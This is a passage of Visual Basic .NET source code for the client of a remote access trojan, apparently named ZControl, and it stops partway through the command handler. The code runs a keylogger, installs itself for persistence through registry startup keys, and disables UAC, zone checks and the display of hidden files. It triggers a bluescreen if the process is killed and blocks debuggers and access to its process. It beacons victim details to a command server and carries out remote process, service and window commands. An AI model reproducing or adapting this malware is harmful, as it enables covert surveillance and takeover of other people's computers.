Imports System.IO
Imports System.Net
Imports System.Text
Imports System.Management
Imports System.Web
Imports System.Globalization
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.ServiceProcess
Imports System.Security.Principal
Imports System.Security.AccessControl
Imports System.ComponentModel
Imports System.Security
Imports System.Runtime.ConstrainedExecution
Imports System.Drawing.Imaging
Imports Microsoft.Win32
Imports AForge.Controls
Imports System.Timers
Imports System.Security.Cryptography

Module ModuleMain


    Public client As New WebClient()
    Private WithEvents pe As New Persistance


#Region "Settings"

    Public DecryptionKey As String = "ZControl"
    Public AuthentificationKey As String = "12345"
    Public HostAdress As String = Settings.StubUrl
    Public StealthMode As Boolean = False
    Public Connected As Boolean = False
    Public Webcam As New Webcam
    Public UniqueID As String = GenerateUnqiueID()
    Private _currentWindow As String
    Private _hook As KeyLogger
    Private keylogs As New StringBuilder
    Public M As Mutex
    Public M2 As Mutex

#End Region

#Region "Main"
    Public Sub Main()

        ' Check if a debugger is present
        If Settings.StubAntiDebug = True Then
            AntiDebug()
        End If

        AddHandler Microsoft.Win32.SystemEvents.PowerModeChanged, AddressOf PowerModeChanged
        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEnding

        StartKeylogger()
        InitializeSettings()
        Console.WriteLine("Settings initialized.")

        If Settings.StubProcessPersistance = True Then
            If Not pe.IsWatcher Then
                Try
                    If Settings.StubProcessSecurity Then
                        ProtectProcess()
                    End If

                    Win32.SetConsoleCtrlHandler(AddressOf Application_ConsoleEvent, True)
                    DebugToConsole("Server started at " & Format(TimeOfDay, "HH:mm:ss"), DebugStatus.Success)
                    Do Until Connected
                        Connect(CStr(ConnectionString()))
                        System.Threading.Thread.Sleep(8000)
                    Loop
                    CheckForCommands()
                Catch ex As NullReferenceException
                    File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\zrcrash.txt", ex.Message & vbNewLine & ex.StackTrace & vbNewLine & ex.InnerException.Source)
                Catch ex As Exception
                    File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\zrcrash.txt", ex.Message & vbNewLine & ex.StackTrace & vbNewLine & ex.InnerException.Source)
                    Console.WriteLine(ex.Message)
                    Console.WriteLine()
                    DebugToConsole("Fatal Error occured: " & ex.ToString(), DebugStatus.Failed)
                End Try
                Application.Run()
            Else
                Do
                    Console.WriteLine("Sending keep alive packet.")
                    Thread.Sleep(5000)
                Loop
            End If
        Else
            Try
                If Settings.StubProcessSecurity Then
                    ProtectProcess()
                End If

                Win32.SetConsoleCtrlHandler(AddressOf Application_ConsoleEvent, True)
                DebugToConsole("Server started at " & Format(TimeOfDay, "HH:mm:ss"), DebugStatus.Success)
                Do Until Connected
                    Connect(CStr(ConnectionString()))
                    System.Threading.Thread.Sleep(8000)
                Loop
                CheckForCommands()
            Catch ex As NullReferenceException
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\zrcrash.txt", ex.Message & vbNewLine & ex.StackTrace & vbNewLine & ex.InnerException.Source)
            Catch ex As Exception
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\zrcrash.txt", ex.Message & vbNewLine & ex.StackTrace & vbNewLine & ex.InnerException.Source)
                Console.WriteLine(ex.Message)
                Console.WriteLine()
                DebugToConsole("Fatal Error occured: " & ex.ToString(), DebugStatus.Failed)
            End Try
            Application.Run()
        End If


    End Sub

    Private Sub SetMutex(ByVal mutex As String)
        M = New Mutex(False, mutex)
        If (M.WaitOne(0, False) = False) Then
            M.Close()
            M = Nothing
            If Environment.GetCommandLineArgs.Length < 2 Then End
        End If
    End Sub

    Public Sub InitializeSettings()



        ' Start server as admin
        If IsElevatedProcess() = False Then
            If Settings.StubElevate = True Then
                If IsElevatedProcess() = False Then
                    RestartElevated()
                End If
            End If
        End If


        'Install server on remote system
        If Settings.StubInstall = True Then
            Dim Foldername As String = Settings.StubFolderName
            Dim Filename As String = Settings.StubFileName
            Dim StartupKeyHKCU As String = Settings.StubHKCUStartupKey
            Dim StartupKeyHKLM As String = Settings.StubHKLMStartupKey
            Dim RunOnce As Boolean = Settings.StubRunOnce

            If Settings.StubHKCUStartup = True Then
                If RunOnce Then
                    If Settings.StubAppData = True Then
                        Installer.Install(StartupLocation.AppData, StartupKeyHKCU, True, False, Foldername, Filename)
                    ElseIf Settings.StubTemp = True Then
                        Installer.Install(StartupLocation.Temp, StartupKeyHKCU, True, False, Foldername, Filename)
                    ElseIf Settings.StubWinDir = True Then
                        Installer.Install(StartupLocation.Windir, StartupKeyHKCU, True, False, Foldername, Filename)
                    End If
                Else
                    If Settings.StubAppData = True Then
                        Installer.Install(StartupLocation.AppData, StartupKeyHKCU, True, True, Foldername, Filename)
                    ElseIf Settings.StubTemp = True Then
                        Installer.Install(StartupLocation.Temp, StartupKeyHKCU, True, True, Foldername, Filename)
                    ElseIf Settings.StubWinDir = True Then
                        Installer.Install(StartupLocation.Windir, StartupKeyHKCU, True, True, Foldername, Filename)
                    End If
                End If
            ElseIf Settings.StubHKLMStartup = True Then
                If RunOnce Then
                    If Settings.StubAppData = True Then
                        Installer.Install(StartupLocation.AppData, StartupKeyHKLM, False, False, Foldername, Filename)
                    ElseIf Settings.StubTemp = True Then
                        Installer.Install(StartupLocation.Temp, StartupKeyHKLM, False, False, Foldername, Filename)
                    ElseIf Settings.StubWinDir = True Then
                        Installer.Install(StartupLocation.Windir, StartupKeyHKLM, False, False, Foldername, Filename)
                    End If
                Else
                    If Settings.StubAppData = True Then
                        Installer.Install(StartupLocation.AppData, StartupKeyHKLM, False, True, Foldername, Filename)
                    ElseIf Settings.StubTemp = True Then
                        Installer.Install(StartupLocation.Temp, StartupKeyHKLM, False, True, Foldername, Filename)
                    ElseIf Settings.StubWinDir = True Then
                        Installer.Install(StartupLocation.Windir, StartupKeyHKLM, False, True, Foldername, Filename)
                    End If
                End If
            End If
        End If

        ' Process Protection
        If Settings.StubProcessSecurity = True Then
            ProtectProcess()
        End If

        'Disable ZoneChecks
        If Settings.StubDisableZonechecks = True Then
            DisableZonechecks()
        End If

        'Disable UAC
        If Settings.StubDisableUAC = True Then
            If IsElevatedProcess() = False Then
                RestartElevated()
            Else
                Shell("C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
            End If
        End If

        ' Process BreakOnTermination (Bluescreen)

        If Settings.StubBlueScreenOnKill = True Then
            If IsElevatedProcess() = False Then
                RestartElevated()
            Else
                BlueScreenOnTermination(True)
            End If
        End If

        ' Start twin process (Process Persistance)
        If Settings.StubProcessPersistance = True Then
            pe.Start()
        End If

        'Check Mutex
        If Installer.MutexCheck(Settings.StubMutex) Then
            Console.WriteLine("Same Mutex Detected!")
            End
        End If

        ' Disable show hidden files
        If Settings.StubDisableShowHiddenFiles = True Then
            DisableShowHiddenFiles()
        End If

        'Anti dll injection
        If Settings.StubAntiDllInject Then
            AntiDllInjection()
        End If

        ' Enable visible mode
        If Settings.StubVisibleMode = True Then
            StealthMode = False
            Win32.AllocConsole()
        Else
            StealthMode = True
        End If

        ' Set hidden attributes
        If Settings.StubHiddenAttrib = True Then
            SetHiddenAttrib()
        End If

        'Unkillable Process Exploit
        If Settings.StubUnkillableProcessExploit = True Then
            UnkillableProcessExploit()
        End If


    End Sub

#End Region



#Region "Stub Security & Stealth"

    Public Sub AntiDebug()
        Dim proc As Process = Process.GetCurrentProcess()
        If (System.Diagnostics.Debugger.IsAttached) Then
            Console.WriteLine("Debugger IsAttached detected. Exiting...")
            Console.ReadKey()
            Environment.Exit(0)
        End If
        If Win32.IsDebuggerPresent() = True Then
            Console.WriteLine("Debugger IsDebuggerPresent detected. Exiting...")
            Console.ReadKey()
            Environment.Exit(0)
        End If
    End Sub

    Public Sub UnkillableProcessExploit()
        Win32.ZwSetInformationProcess(Win32.GetCurrentProcess(), CType(&H21&, IntPtr), CType(VarPtr(&H8000F129), IntPtr), CType(&H4&, IntPtr))
    End Sub

    Private Function VarPtr(ByVal e As Object) As Integer
        Dim GC As GCHandle = GCHandle.Alloc(e, GCHandleType.Pinned)
        Dim GC2 As Integer = GC.AddrOfPinnedObject.ToInt32
        GC.Free()
        Return GC2
    End Function

    Private Sub SetHiddenAttrib()
        Try
            File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)
        Catch
        End Try
    End Sub

    Public Sub AntiDllInjection()
        Dim LoadLibraryA As IntPtr = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32"), "LoadLibraryA")
        Dim LoadLibraryW As IntPtr = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32"), "LoadLibraryW")
        If LoadLibraryA <> IntPtr.Zero Then Win32.WriteProcessMemory(Process.GetCurrentProcess.Handle, LoadLibraryA, New Byte() {&HC2, &H4, &H0, &H90}, 4, 0)
        If LoadLibraryW <> IntPtr.Zero Then Win32.WriteProcessMemory(Process.GetCurrentProcess.Handle, LoadLibraryW, New Byte() {&HC2, &H4, &H0, &H90}, 4, 0)
    End Sub

    Private Sub DisableShowHiddenFiles()
        Dim regloc As String = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
        My.Computer.Registry.SetValue(regloc, "Hidden", "0", Microsoft.Win32.RegistryValueKind.DWord)
    End Sub

    Function Watcher() As Boolean
        Dim t As New Threading.Thread(Sub()
                                          Dim name As String = Reflection.Assembly.GetExecutingAssembly.GetName.Name
                                          Do
                                              If Process.GetProcessesByName(name).Length < 2 Then
                                                  If Environment.GetCommandLineArgs.Length > 1 Then
                                                      Process.Start(name)
                                                  Else
                                                      Process.Start(name, "_")
                                                  End If
                                              End If
                                          Loop
                                      End Sub) : t.Start()
        Return Environment.GetCommandLineArgs.Length < 2
    End Function

    Private Sub BlueScreenOnTermination(ByVal Enable As Boolean)
        Win32.NtSetInformationProcess(Process.GetCurrentProcess.Handle, 29, CInt(Enable), 4)
    End Sub

    Public Sub DisableZonechecks()
        Try
            Dim proc As New Process
            Dim StartInfo As New System.Diagnostics.ProcessStartInfo
            StartInfo.FileName = "cmd"
            StartInfo.RedirectStandardInput = True
            StartInfo.RedirectStandardOutput = True
            StartInfo.UseShellExecute = False
            StartInfo.CreateNoWindow = True
            proc.StartInfo = StartInfo
            proc.Start()
            Dim w As System.IO.StreamWriter = proc.StandardInput
            w.WriteLine("echo [zoneTransfer]ZoneID = 2 > " & Application.ExecutablePath & ":ZONE.identifier")
            w.WriteLine("exit")
            w.Close()
            Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
        Catch
            Try
                Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
            Catch : End Try
        End Try
    End Sub

    Public Function GetProcessSecurityDescriptor(ByVal processHandle As IntPtr) As RawSecurityDescriptor
        On Error Resume Next
        Dim array As Byte() = New Byte(-1) {}
        Dim num As UInteger
        Win32.GetKernelObjectSecurity(processHandle, 4, array, 0UI, num)
        If CULng(num) > 32767UL Then
            Throw New Win32Exception()
        End If
        If Not Win32.GetKernelObjectSecurity(processHandle, 4, InlineAssignHelper(array, New Byte(CInt(CType(num, UIntPtr)) - 1) {}), num, num) Then
            Throw New Win32Exception()
        End If
        Return New RawSecurityDescriptor(array, 0)
    End Function

    Public Sub ProtectProcess()
        On Error Resume Next
        Dim currentProcess As IntPtr = Win32.GetCurrentProcess()
        Dim processSecurityDescriptor As RawSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess)
        processSecurityDescriptor.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
        SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor)
        Settings.StubProcessSecurity = True
    End Sub

    Public Sub UnProtectProcess()
        On Error Resume Next
        Dim currentProcess As IntPtr = Win32.GetCurrentProcess()
        Dim processSecurityDescriptor As RawSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess)
        processSecurityDescriptor.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessAllowed, 2035711, New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
        SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor)
        Settings.StubProcessSecurity = False
    End Sub

    Public Sub SetProcessSecurityDescriptor(ByVal processHandle As IntPtr, ByVal dacl As RawSecurityDescriptor)
        On Error Resume Next
        Dim array As Byte() = New Byte(dacl.BinaryLength - 1) {}
        dacl.GetBinaryForm(array, 0)
        If Not Win32.SetKernelObjectSecurity(processHandle, 4, array) Then
        End If
    End Sub

    Private Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
        On Error Resume Next
        target = value
        Return value
    End Function

#End Region

#Region "Connection & Communication"


    Public Function Connect(ByVal UserData As String) As Boolean
        Try
            Dim ResponseFromServer As String = Communicate("connect&key=" & AuthentificationKey, "ID=" & UniqueID & "&Data=" & UserData)
            If ResponseFromServer = "Connection error" Then
                DebugToConsole("Connecting failed. Invalid key", DebugStatus.Failed)
                Return False
            End If
            DebugToConsole("Connected to " & HostAdress & ".", DebugStatus.Success)
            Connected = True
            Return True
        Catch ex As Exception
            DebugToConsole("Unable to connect to " & HostAdress & ". " & ex.Message, DebugStatus.Failed)
            Connect = False
            Return False
        End Try
    End Function

    Public Sub Disconnect()
RetryDisconnect:
        Try
            Communicate("disconnect&key=" & AuthentificationKey, "ID=" & UniqueID)
            DebugToConsole("Disconnected.", DebugStatus.Success)
        Catch ex As Exception
            GoTo RetryDisconnect
            DebugToConsole("Unable to disconnect from " & HostAdress & ", retrying...", DebugStatus.Failed)
        End Try
    End Sub

    Public Sub WriteCommand(ByVal cmd As String)
RetryWriteData:
        Try
            Communicate("writecmd", "Data=" & String2Hex(cmd))
        Catch
            DebugToConsole("Unable to write command.", DebugStatus.Failed)
        End Try
    End Sub

    Public Sub WriteData(ByVal data As String)
RetryWriteData:
        Try
            Communicate("writedata", "Data=" & String2Hex(data))
        Catch
            GoTo RetryWriteData
            DebugToConsole("Unable to write data, retrying...", DebugStatus.Failed)
        End Try
    End Sub

    Public Sub WriteDataNoEncryption(ByVal data As String)
RetryWriteDataNoEncryption:
        Try
            Communicate("writedata", "Data=" & data)
        Catch
            GoTo RetryWriteDataNoEncryption
            DebugToConsole("Unable to write data, retrying...", DebugStatus.Failed)
        End Try
    End Sub

    Public Function ReadData() As String
RetryReadData:
        Try
            Return Hex2String(Communicate("readdata"))
        Catch
            DebugToConsole("Unable to read data. Retrying...", DebugStatus.Failed)
            GoTo RetryReadData

        End Try
    End Function

    Public Function ReadCommand() As String
RetryReadCmd:
        Try
            Dim hextostr As String = Hex2String(Communicate("readcmd"))
            Return hextostr
        Catch
            GoTo RetryReadCmd
        End Try
    End Function

    Public Sub WriteResponse(ByVal cmd As String)
RetryCleanWriteResponse:
        Try
            Communicate("saveresponse", "Data=" & String2Hex(cmd))
        Catch
            GoTo RetryCleanWriteResponse
            DebugToConsole("Unable to write response, retrying...", DebugStatus.Pending)
        End Try
    End Sub

    Public Sub CleanCommand()
RetryCleanCommands:
        Try
            Communicate("clearcmd")
        Catch ex As Exception
            DebugToConsole("Unable to clean commands.", DebugStatus.Failed)
            GoTo RetryCleanCommands
        End Try
    End Sub

    Public Function Communicate(ByVal cmd As String, Optional ByVal data As String = "") As String
        If String.IsNullOrEmpty(data) Then data = " "
        Dim request As HttpWebRequest = DirectCast(HttpWebRequest.Create(HostAdress & "/main.php?cmd=" & cmd), HttpWebRequest)
        request.Method = "POST"
        request.KeepAlive = True
        request.ContentType = "application/x-www-form-urlencoded"
        Using stream = New StreamWriter(request.GetRequestStream())
            stream.Write(data)
            stream.Flush()
        End Using
        Using reader As New StreamReader(request.GetResponse.GetResponseStream)
            Return reader.ReadToEnd
        End Using
    End Function

#End Region

#Region "General Checks"

    Public Function IsNullOrWhiteSpace(s As String) As Boolean
        If s Is Nothing Then
            Return True
        End If
        Return (s.Trim() = String.Empty)
    End Function


    Private Sub CheckForCommands()
        Do
            System.Threading.Thread.Sleep(Settings.StubQuerySpeed)
            Dim command As String = ReadCommand()
            If Not ((command = "") Or (IsNullOrWhiteSpace(command))) Then
                AnalyzeCommand(command)
            Else
                Continue Do
            End If
        Loop
    End Sub

    Const OS_ANYSERVER As Integer = 29
    Public Function IsWindowsServer() As Boolean
        Return Win32.IsOS(OS_ANYSERVER)
    End Function

    Public Function GetOS() As String
        Dim version = Environment.OSVersion.Version
        Select Case version.Major
            Case 5
                Select Case version.Minor
                    Case 0
                        Return "Windows 2000"
                    Case 1
                        Return "Windows XP"
                    Case 2
                        If IsWindowsServer() = True Then
                            Return "Windows Server 2003"
                        Else
                            Return "Windows XP"
                        End If
                End Select
                Exit Select
            Case 6
                Select Case version.Minor
                    Case 0
                        If IsWindowsServer() = True Then
                            Return "Windows Server 2008"
                        Else
                            Return "Windows Vista"
                        End If
                    Case 1
                        If IsWindowsServer() = True Then
                            Return "Windows Server 2008 R2"
                        Else
                            Return "Windows 7"
                        End If
                    Case 2
                        If My.Computer.Info.OSFullName.Contains("8.1") Then
                            Return "Windows 8.1"
                        Else
                            If IsWindowsServer() = True Then
                                Return "Windows Server 2012"
                            Else
                                Return "Windows 8"
                            End If
                        End If
                    Case Else
                        Return "Unknown OS"
                End Select
            Case Else
                Return "Unknown OS"
        End Select
        Return "Unknown OS"
    End Function

    Public Function ConnectionString() As String
        Try
            Dim a As String = UniqueID
            Dim b As String = Environment.UserName()
            Dim c As String = System.Environment.MachineName
            Dim d As String = GetOS() & " " & Win32.GetOSArchitecture
            Dim e As String = RegionInfo.CurrentRegion.EnglishName
            Dim f As String = RegionInfo.CurrentRegion.TwoLetterISORegionName
            Dim g As String = Settings.ServerVersion
            Dim h As String = WebcamAvailable()
            Return (a & "|||" & b & "|||" & c & "|||" & d & "|||" & e & " (" & f) & ")|||" & g & "|||" & h & "|||"
        Catch
            Return "Error"
        End Try
    End Function

#End Region

#Region "Encryption"



    Public Function AESEncrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Public Function AESDecrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Public Function ScreenshotToHex(ByVal Image As Image) As String
        Dim bytearray As Byte() = Nothing
        If Not Image Is Nothing Then
            Using ms As New MemoryStream
                Image.Save(ms, ImageFormat.Jpeg)
                ms.Seek(0, 0)
                bytearray = ms.ToArray
            End Using
            DebugToConsole("Converted Screenshot to string data with success.", DebugStatus.Success)
            Return [String].Join([String].Empty, Array.ConvertAll(bytearray, Function(x) x.ToString("X2")))
        Else
            DebugToConsole("Cannot convert image data to string!", DebugStatus.Failed)
            Return String.Empty
        End If
    End Function

    Public Function HexToImage(ByVal Hex As String) As Image
        Dim Bytes(Hex.Length \ 2 - 1) As Byte
        For I = 0 To Bytes.Length - 1
            Bytes(I) = Convert.ToByte(Hex.Substring(I * 2, 2), 16)
        Next
        Return Image.FromStream(New IO.MemoryStream(Bytes))
    End Function
    Private Function ImageToHex(ByVal Img As Image) As String
        Using Ms As New IO.MemoryStream
            Img.Save(Ms, Imaging.ImageFormat.Png)
            Return BitConverter.ToString(Ms.ToArray, 0).Replace("-", "")
        End Using
    End Function

    Public Function String2Hex(s As String) As String
        Return String.Concat(Encoding.UTF8.GetBytes(s).Select(Function(b) b.ToString("X2")).ToArray())
    End Function

    Public Function Hex2String(s As String) As String
        Dim bytes(s.Length \ 2 - 1) As Byte
        For i = 0 To bytes.Length - 1
            bytes(i) = Byte.Parse(s.Substring(i * 2, 2), NumberStyles.HexNumber)
        Next
        Return Encoding.UTF8.GetString(bytes)
    End Function

#End Region

#Region "String Manipulation etc"
    Private Function InstanceCount(ByVal StringToSearch As String, ByVal StringToFind As String) As Integer
        If CBool(Len(StringToFind)) Then
            InstanceCount = UBound(Split(StringToSearch, StringToFind))
        End If
        Return InstanceCount
    End Function

    <System.Runtime.CompilerServices.Extension> _
    Public Function ReplaceFirstOccurrance(original As String, oldValue As String, newValue As String) As String
        If [String].IsNullOrEmpty(original) Then
            Return [String].Empty
        End If
        If [String].IsNullOrEmpty(oldValue) Then
            Return original
        End If
        If [String].IsNullOrEmpty(newValue) Then
            newValue = [String].Empty
        End If
        Dim loc As Integer = original.IndexOf(oldValue)
        Return original.Remove(loc, oldValue.Length).Insert(loc, newValue)
    End Function

#End Region

#Region "Handle System Shutdown, Logoff, Restart"
    Private Sub PowerModeChanged(ByVal sender As System.Object, _
     ByVal e As Microsoft.Win32.PowerModeChangedEventArgs)
        Select Case e.Mode
            Case Microsoft.Win32.PowerModes.Resume
                Connect(CStr(ConnectionString()))
            Case Microsoft.Win32.PowerModes.Suspend
                DebugToConsole("Disconnecting, Windows is about to Sleep.", DebugStatus.Pending)
                Disconnect()
        End Select
    End Sub
    Private Sub SessionEnding(ByVal sender As System.Object, _
ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Select Case e.Reason
            Case Microsoft.Win32.SessionEndReasons.Logoff
                DebugToConsole("Disconnecting, Windows is about to Logoff.", DebugStatus.Pending)
                Disconnect()
            Case Microsoft.Win32.SessionEndReasons.SystemShutdown
                DebugToConsole("Disconnecting, Windows is about to shutdown.", DebugStatus.Pending)
                Disconnect()
        End Select
    End Sub
#End Region

#Region "Analyze Commands"
    Public Sub AnalyzeCommand(ByVal commandString As String)
        If (commandString.Split(CChar("|"))(0) = UniqueID) Or (commandString.Split(CChar("|"))(0) = "ALL") Then

            Select Case commandString.Split(CChar("|"))(1)
                Case "1"
                    DebugToConsole("Command: Closing Server.", DebugStatus.Success)
                    WriteResponse("1")
                    UnProtectProcess()
                    pe.Stop()
                    pe.KillWatchers()
                    Disconnect()
                    BlueScreenOnTermination(False)
                    CleanCommand()
                    Environment.Exit(0)
                Case "2"
                    DebugToConsole("Command: Restart Server.", DebugStatus.Success)
                    WriteResponse("2")
                    UnProtectProcess()
                    pe.Stop()
                    pe.KillWatchers()
                    Disconnect()
                    BlueScreenOnTermination(False)
                    CleanCommand()
                    Process.Start(Application.ExecutablePath)
                    Environment.Exit(0)
                Case "3"
                    DebugToConsole("Command: Restart Server as Administrator...", DebugStatus.Pending)
                    UnProtectProcess()
                    pe.Stop()
                    pe.KillWatchers()
                    RestartElevated()
                    WriteResponse("3")
                    Disconnect()
                    BlueScreenOnTermination(False)
                    CleanCommand()
                Case "4"
                    DebugToConsole("Command: Uninstall Server.", DebugStatus.Success)
                    WriteResponse("4")
                    UnProtectProcess()
                    pe.Stop()
                    Disconnect()
                    BlueScreenOnTermination(False)
                    CleanCommand()
                    UninstallServer()
                Case "5"
                    DebugToConsole("Command: Get Processlist...", DebugStatus.Pending)
                    Try
                        WriteData(ListProcesses())
                        WriteResponse("5")
                        DebugToConsole("Processlist sent with success", DebugStatus.Success)
                    Catch
                        DebugToConsole("Failed sending processlist.", DebugStatus.Failed)
                    End Try

                    CleanCommand()
                Case "6"
                    Dim PName As String = CStr(ReadData())
                    DebugToConsole("Command: Start Process: " & PName, DebugStatus.Success)
                    If StartProcess(PName) = True Then
                        WriteResponse("6")
                    Else
                        WriteResponse("6x1")
                    End If
                    CleanCommand()
                Case "7"
                    Dim Pid As String = CStr(ReadData())
                    DebugToConsole("Command: Terminate Process: " & Pid, DebugStatus.Success)
                    If TerminateProcess(CInt(Pid)) = True Then
                        WriteResponse("7")
                    Else
                        WriteResponse("7x1")
                    End If
                    CleanCommand()
                Case "8"
                    Dim Pid As String = CStr(ReadData())
                    DebugToConsole("Command: Getting modules for Process PID " & Pid & ".", DebugStatus.Pending)
                    Dim ModuleResult As String = ListModules(CInt(Pid))
                    If Not ModuleResult = "8x1" Then
                        WriteData(ModuleResult)
                        WriteResponse("8")
                        DebugToConsole("Grabbed modules for Process PID " & Pid & ".", DebugStatus.Success)
                    Else
                        WriteResponse("8x1")
                        DebugToConsole("Unable to get modules for Process PID " & Pid & ".", DebugStatus.Failed)
                    End If
                    CleanCommand()
                Case "9"
                    DebugToConsole("Command: Getting Services.", DebugStatus.Pending)
                    WriteData(EnumerateServices())
                    DebugToConsole("Command: Got Services successfully.", DebugStatus.Success)
                    WriteResponse("9")
                    CleanCommand()
                Case "10"
                    Dim ServiceToStart As String = CStr(ReadData())
                    DebugToConsole("Command: Starting Service: " & ServiceToStart & ".", DebugStatus.Pending)
                    If StartService(ServiceToStart) = True Then
                        DebugToConsole("Command: Started service: " & ServiceToStart & " with success.", DebugStatus.Success)
                        WriteResponse("10")
                    Else
                        DebugToConsole("Command: Failed starting service: " & ServiceToStart & ".", DebugStatus.Failed)
                        WriteResponse("10x1")
                    End If
                    CleanCommand()
                Case "11"
                    Dim ServiceToStop As String = CStr(ReadData())
                    DebugToConsole("Command: Stopping service: " & ServiceToStop & ".", DebugStatus.Pending)
                    If IsElevatedProcess() = True Then
                        If CanStop(ServiceToStop) = True Then
                            StopSvc(ServiceToStop)
                            DebugToConsole("Stopped service: " & ServiceToStop & ". with success.", DebugStatus.Success)
                            WriteResponse("11")
                        Else
                            DebugToConsole("Unable to stop service: " & ServiceToStop & ". This service can't be stopped.", DebugStatus.Failed)
                            WriteResponse("11x1")
                        End If
                    Else
                        DebugToConsole("Unable to stop service: " & ServiceToStop & ". Access denied.", DebugStatus.Failed)
                        WriteResponse("11x1")
                    End If
                    CleanCommand()
                Case "12"
                    DebugToConsole("Command: Retrieving service path...", DebugStatus.Pending)
                    WriteData(GetSvcPath(CStr(ReadData())))
                    DebugToConsole("Sent service path...", DebugStatus.Success)
                    WriteResponse("12")
                    CleanCommand()
                Case "13"
                    DebugToConsole("Command: Get Systeminformation...", DebugStatus.Pending)
                    WriteData(SystemInfo())
                    DebugToConsole("Systeminformation recieved with success", DebugStatus.Success)
                    WriteResponse("13")
                    CleanCommand()
                Case "14"
                    DebugToConsole("Command: Get Serverinformation...", DebugStatus.Pending)
                    WriteData(GetServerInformation)
                    DebugToConsole("Serverinformation recieved with success", DebugStatus.Success)
                    WriteResponse("14")
                    CleanCommand()
                Case "15"
                    DebugToConsole("Command: Get Active Windows...", DebugStatus.Pending)
                    WriteData(EnumerateWindows())
                    DebugToConsole("Active Windows recieved with success", DebugStatus.Success)
                    WriteResponse("15")
                    CleanCommand()
                Case "16"
                    Dim Handle As String = CStr(ReadData())
                    DebugToConsole("Command: Restore window with handle " & Handle & " ...", DebugStatus.Pending)
                    RestoreWindow(CType(Handle, IntPtr))
                    DebugToConsole("Window restored with success", DebugStatus.Success)
                    WriteResponse("16")
                    CleanCommand()
                Case "17"
                    Dim Handle As String = CStr(ReadData())
                    DebugToConsole("Command: Minimize Window with handle " & Handle & " ...", DebugStatus.Pending)
                    MinimizeWindow(CType(Handle, IntPtr))
                    DebugToConsole("Window minimized with success", DebugStatus.Success)
                    WriteResponse("17")
                    CleanCommand()
                Case "18"
                    Dim Handle As String = CStr(ReadData())
                    DebugToConsole("Command: Maximize window with handle " & Handle & " ...", DebugStatus.Pending)
                    MaximizeWindow(CType(Handle, IntPtr))
                    DebugToConsole("Window maximized with success", DebugStatus.Success)
                    WriteResponse("18")
                    CleanCommand()
                Case "19"
                    Dim Handle As String = CStr(ReadData())
                    DebugToConsole("Command: Close window with handle " & Handle & " ...", DebugStatus.Pending)
                    CloseWindow(CType(Handle, IntPtr))
                    DebugToConsole("Window closed with success", DebugStatus.Success)
                    WriteResponse("19")
                    CleanCommand()
                Case "20"
                    Dim Handle As String = CStr(ReadData())
                    DebugToConsole("Command: Freezing window with handle " & Handle & " ...", DebugStatus.Pending)
                    FreezeWindow(CType(Handle, IntPtr))
                    DebugToConsole("Window freezed with success", DebugStatus.Success)
                    WriteResponse("20")
                    CleanCommand()
                Case "21"
                    Dim Handle As String = CStr(ReadData())
                    DebugToConsole("Command: Unfreezing window with handle " & Handle & " ...", DebugStatus.Pending)
                    UnfreezeWindow(CType(Handle, IntPtr))
                    DebugToConsole("Window unfreezed with success", DebugStatus.Success)
                    WriteResponse("21")
                    CleanCommand()
                Case "22"
